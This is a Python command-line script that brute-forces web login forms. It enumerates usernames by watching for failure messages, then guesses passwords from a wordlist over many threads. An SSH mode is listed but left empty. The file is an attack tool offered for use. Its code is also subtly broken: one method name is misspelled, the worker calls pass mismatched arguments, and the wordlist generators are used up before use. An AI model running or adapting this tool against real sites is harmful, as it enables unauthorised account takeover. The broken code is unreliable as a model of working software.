#!/usr/bin/env python3


import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import random
import requests
import string


def http_target_up(target, headers = None):
    """
    Function Name:
        http_target_up
    Author:
        Thomas Osgood
    Description:
        Function designed to check that a website is reachable.
    Input(s):
        target - full url of login page to check.
        headers - special http headers to include in request. optional.
    Return(s):
        message - status message.
        success - boolean indication of successful connection.
        (success, message) - return format.
    """
    message = str()
    success = bool()

    try:
        if not(isinstance(target, str)):
            raise ValueError(f"Target Must Be A String. Got {type(target)}")

        http_response = requests.get(target, headers = headers)

        if http_response.status_code != 200:
            raise ValueError(f"Bad Status Code Returned {http_response.status_code}")
        
        message = f"Successfully Connected To Target. (Code: {http_response.status_code})"
        success = True
    except Exception as e:
        message = e
        success = False

    return (success, message)


def attack_http(target, wordlist, userfail, passfail, username = None, thread_count = None, userfield = None, passfield = None):
    """
    Function Name:
        attack_http
    Author:
        Thomas Osgood
    Description:
        Function designed to brute force a website login. Uses POST request.
    Input(s):
        target - link to target login page.
        wordlist - wordlist to use for brute-force attack.
        userfail - incorrect username message to look for.
        passfail - incorrect password message to look for.
        username - if username is already known, use this. default = None.
        thread_count - number of threads to use for attack. minimum = 1. maximum = 64. default = 10.
        userfield - name of username field in http form.
        passfield - name of password field in http form.
    Return(s):
        creds - credentials found. None if not found.
        success - boolean indication of success.
        message - status message.
        (creds, success, message) - return format.
    """
    creds = str()
    found_pass = None
    found_user = None
    max_threads = 64
    message = str()
    min_threads = 1
    success = bool()

    try:
        # Thread Count Validation
        if thread_count is None:
            thread_count = 10
        elif not(isinstance(thread_count, int)):
            raise ValueError("thread_count must be an integer value.")
        elif thread_count < min_threads:
            print(f"[*] thread_count Less Than {min_threads}. Setting To {min_threads}.")
            thread_count = min_threads
        elif thread_count > max_threads:
            print(f"[*] thread_count Greater Than {max_threads}. Setting To {max_threads}.")
            thread_count = max_threads
            
        if username is None:
            users = gen_passwords(wordlist)

            # Brute Force Username (Multi-Threaded)            
            wordlist_len = len(list(users))
            with ThreadPoolExecutor(max_workers=thread_count) as executor:
                workers = executor.map(
                    user_worker_http, users, [target] * wordlist_len, [userfail] * wordlist_len,
                    [userfail] * wordlist_len, [userfield] * wordlist_len, [passfield] * wordlist_len
                )
                try:
                    for cur_user, success, message in workers:
                        if success:
                            found_user = cur_user
                            executor.shutown(wait=False)
                            break

                except KeyboardInterrupt:
                    message = "User Terminated Via KeyboardInterrupt"
                    raise KeyboardInterrupt(message)
                except Exception as ex:
                    executor.shutdown(wait=False)
                    message = str(ex)
                    raise ex           
        else:
            found_user = username

        if found_user is None:
            raise ValueError("No Username Found")

        del(users)

        passwds = gen_passwords(wordlist)

        # Brute Force Password (Multi-Threaded)
        passwds_len = len(list(passwds))
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            workers = executor.map(
                pass_worker_http, [found_user] * passwds_len, [target] * passwds_len,
                [passfail] * passwds_len, [userfield] * passwds_len, [passfield] * passwds_len
            )

            try:
                for cur_pass, success, message in workers:
                    if success:
                        found_pass = cur_pass
                        executor.shutdown(wait=False)
                        break
            except KeyboardInterrupt:
                message = "User Terminated Via KeyboardInterrupt"
                raise KeyboardInterrupt(message)
            except Exception as ex:
                executor.shutdown(wait=False)
                message = str(ex)
                raise ex

        if found_pass is None:
            raise ValueError("No Password Found")

        creds = f"{found_user}:{found_pass}"
        message = f"Credentials Discovered: \"{creds}\""
        success = True
    except Exception as e:
        creds = None
        message = str(e)
        success = False

    return (creds, success, message)


def gen_passwords(filename):
    """
    Function Name:
        gen_passwords
    Author:
        Thomas Osgood
    Description:
        Function designed to generate passwords from a given wordlist. This is more
        efficient than reading the entire file into memory, especially if the wordlist
        file is large (ex: rockyou).
    Input(s):
        filename - wordlist filename to generate passwords from.
    Return(s):
        password - next password read from file. technically "yielded", not returned.
    """
    try:
        # Validate Filename And Existance
        exists, message = wordlist_exists(filename)

        if not(exists):
            raise ValueError(f"Wordlist Issue: {message}")

        # Go Through Wordlist And Generate Passwords
        with open(filename, "rb") as fptr:
            for password in fptr:
                yield password
    except Exception as e:
        print(f"[-] {e}")

    return


def make_request_http(target, payload, headers = None):
    """
    Function Name:
        make_request_http
    Author:
        Thomas Osgood
    Description:
        Function designed to handle a POST request for brute force.
    Input(s):
        target - url to send POST request to.
        payload - dictionary containing username and password fields and values.
        headers - additional headers to send with request. optional.
    Return(s):
        message - status message.
        response - response object from requests library.
        success - boolean indication of success.
        (response, success, message) - return format.
    """
    message = str()
    response = None
    success = bool()

    try:
        if headers is None:
            headers = { "User-Agent": "Brutus" }
            
        response = requests.post(target, data = payload, headers = headers)

        if response.status_code >= 400:
            raise ValueError(f"Bad Status Code: {response.status_code}")

        message = f"Request Completed With Status Code: {response.status_code}"
        success = True

    except Exception as e:
        message = e
        response = None
        success = False

    return (response, success, message)


def pass_worker_http(username, password, target, passfail, userfield = None, passfield = None):
    """
    Function Name:
        pass_worker_http
    Author:
        Thomas Osgood
    Description:
        Function designed to be a worker for bruting a username.
    Input(s):
        username - username to test the password for.
        password - password to test the target for.
        target - full url to test username on.
        passfail - incorrect password message to check for.
        userfield - name of field used to transmit username. default = username.
        passfield - name of field used to transmit password. default = password.
    Return(s):
        password - password tested.
        message - status message.
        success - boolean indication of success.
        (success, message) - return format
    """
    message = str()
    payload = dict()
    success = bool()

    try:
        if userfield is None:
            userfield = "username"

        if passfield is None:
            passfield = "password"

        payload[userfield] = username
        payload[passfield] = password


        response, success, message = make_request_http(target, payload)

        if not(success):
            raise ValueError(f"Error Sending Request: {message}")

        if passfail in response.text:
            raise ValueError(f"Password \"{password}\" Incorrect")

        message = f"Password Found: {password}"
        success = True

    except Exception as e:
        success = False
        message = f"Status: {e}"

    return (password, success, message)


def user_worker_http(username, target, userfail, userfield = None, passfield = None):
    """
    Function Name:
        user_worker_http
    Author:
        Thomas Osgood
    Description:
        Function designed to be a worker for bruting a username.
    Input(s):
        username - name to test the target for.
        target - full url to test username on.
        userfail - incorrect username message to check for.
        userfield - name of field used to pass in username. default = username.
        passfield - name of field used to pass in password. default = password.
    Return(s):
        username - username tested.
        message - status message.
        success - boolean indication of success.
        (success, message) - return format
    """
    alphabet = f"{string.ascii_lowercase}{string.ascii_uppercase}{string.digits}"
    letters = list()
    message = str()
    password = str()
    password_len = random.randint(5,10)
    payload = dict()
    success = bool()

    try:
        if userfield is None:
            userfield = "username"

        if passfield is None:
            passfield = "password"

        # Generate Random Password To Test With
        letters = [random.choice(alphabet) for i in range(password_len)]
        password = "".join(letters)

        # Setup Payload Dictionary
        payload[userfield] = username
        payload[passfield] = password

        response, success, message = make_request_http(target, payload)

        if not(success):
            raise ValueError(f"Error Sending Request: {message}")

        if userfail in response.text:
            raise ValueError(f"Username \"{username}\" Incorrect")

        message = f"Username Found: {username}"
        success = True

    except Exception as e:
        success = False
        message = f"Status: {e}"

    return (username, success, message)


def wordlist_exists(wordlist):
    """
    Function Name:
        wordlist_exists
    Author:
        Thomas Osgood
    Description:
        Function designed to check if the wordlist provided exists and is a valid file.
    Input(s):
        wordlist - filename to check for.
    Return(s):
        message - status message.
        success - boolean indication of success.
        (success, message) - return format.
    """
    message = str()
    success = bool()

    try:
        # Check If Wordlist Exists
        if not(os.path.exists(wordlist)):
            raise ValueError(f"\"{wordlist}\" Does Not Exist")

        # Check If Wordlist Is A File
        if not(os.path.isfile(wordlist)):
            raise ValueError(f"\"{wordlist}\" Is Not A File")

        success = True
        message = f"\"{wordlist}\" Exists"
    except Exception as e:
        success = False
        message = f"ERROR: {e}"

    return (success, message)


def main():
    """
    Function Name:
        main
    Author:
        Thomas Osgood
    Description:
        Function designed to run if the program is run as main.
    Input(s):
        None
    Return(s):
        None
    """
    # Create List Of Allowed Attack Types
    attacks = ["http", "ssh"]
    target = str()
    thread_choices = list(range(1,65))

    # Setup Arguments For Tool
    parser = argparse.ArgumentParser()

    ## Required Arguments
    parser.add_argument("attack", help = "Type of attack to run.", choices = attacks)
    parser.add_argument("wordlist", help = "Wordlist to use for attack.")

    ## Optional Arguments
    parser.add_argument("-t", "--threads", help = "Number of threads to user. 1 to 64. Default 10.", dest = "threads", type = int, choices=thread_choices)
    parser.add_argument("-U", "--username", help = "Specific username to brute-force.", dest = "username")

    parser.add_argument("--userfail", help = "Phrase given when username incorrect. Default \"Incorrect Username\".", dest = "userfail")
    parser.add_argument("--passfail", help = "Phrase given when password incorrect. Default \"Incorrect Password\".", dest = "passfail")
    parser.add_argument("--userfield", help = "Name of username input in HTTP form. Default \"username\".", dest = "userfield")
    parser.add_argument("--passfield", help = "Name of password input in HTTP form. Default \"password\".", dest = "passfield")

    ### Attack-Type Specific Options
    parser.add_argument("-i", "--ip", help = "IP address of target to attack. (Non-HTTP attacks only)", dest = "machine_ip")
    parser.add_argument("-u", "--url", help = "URL of target for HTTP brute force.", dest = "url")

    # Get Arguments From User
    args = parser.parse_args()

    attack = args.attack

    print(f"[+] Attack Chosen: {attack}")

    filename = args.wordlist

    # Check For Target Username Passed In
    target_username = None
    if args.username:
        target_username = args.username

    # Setup Check For Incorrect Username
    username_fail_message = str()
    if args.userfail:
        username_fail_message = args.userfail
    else:
        username_fail_message = "Incorrect Username"

    # Setup Check For Incorrect Password
    password_fail_message = str()
    if args.passfail:
        password_fail_message = args.passfail
    else:
        password_fail_message = "Incorrect Password"

    # Get Thread Count
    thread_count = int()
    if args.threads:
        thread_count = args.threads
    else:
        thread_count = 10
    
    try:

        # Validate Given Wordlist
        success, message = wordlist_exists(filename) 

        if not(success):
            raise ValueError(message)

        print(f"[+] {message}")

        # Validate Attack-Type Options
        if attack == "http":

            # Setup Userfield
            username_field_name = str()
            if args.userfield:
                username_field_name = args.userfield
            else:
                username_field_name = "username"

            # Setup Passfield
            password_field_name = str()
            if args.passfield:
                password_field_name = args.passfield
            
            if args.url:
                target = args.url
            else:
                raise argparse.ArgumentError(None, "HTTP Attack Required URL Argument.")
            print("[+] Target Set.")

            # Make Sure Target Is Online
            success, message = http_target_up(target)

            if not(success):
                raise ValueError(message)
            
            print(f"[+] {message}")

            # Begin Attack
            creds, success, message = attack_http(
                        target, filename, username_fail_message, password_fail_message, 
                        username = target_username, userfield = username_field_name, passfield = password_field_name,
                        thread_count = thread_count
                    )

            if not(success):
                raise ValueError("Brute Force Complete. No Credentials Found.")
            
            print(f"[+] Credentials Found: \"{creds}\"")

        elif attack == "ssh":
            if args.machine_ip is None:
                raise argparse.ArgumentError(None,"Must Specify Machine To SSH Brute Force. (-i or --ip)")
            
            target = args.machine_ip

    except Exception as e:
        print(f"[-] {e}")

    return


if __name__ == "__main__":
    # If Tool Not Imported, Run MAIN Function
    main()
